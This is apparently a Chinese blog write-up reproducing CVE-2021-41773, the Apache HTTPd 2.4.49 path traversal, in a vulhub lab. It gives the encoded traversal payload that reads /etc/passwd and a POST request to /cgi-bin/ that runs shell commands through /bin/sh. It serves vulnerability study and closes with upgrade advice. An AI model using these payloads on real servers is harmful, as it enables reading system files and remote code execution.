Apache HTTPd(CVE-2021-41773) 2.4.49 路径穿越漏洞复现
2023-01-12 15:14:15

漏洞简介

​ Apache HTTPd 是Apache基金会开源的一款HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞。攻击者利用这个漏洞，可以读取到Apache服务器web目录以外的其他文件，或读取web中的脚本源码，如果服务器开启CGI或cgid服务，攻击者可进行任意代码执行。

影响版本

Apache HTTPd 2.4.49/2.4.50版本 且穿越的目录允许被访问。

漏洞复现

1、打开vulhub靶场（需要输入sudo docker-compose up --build)

在输入sudo docker-compose up -d

2、输入漏洞地址（ip+8080）

3、抓包如下图所示：

4、使用poc：

/icons/.%%32%65/%%32%65%

%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd

5、使用burp自动解码，将poc解码查看（即为../../../../../)：

6、使用poc2,改为post模式，如下图所示：

POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1

echo; ls

修复建议


升级到最新版的Apache HTTP Server 安全版本。
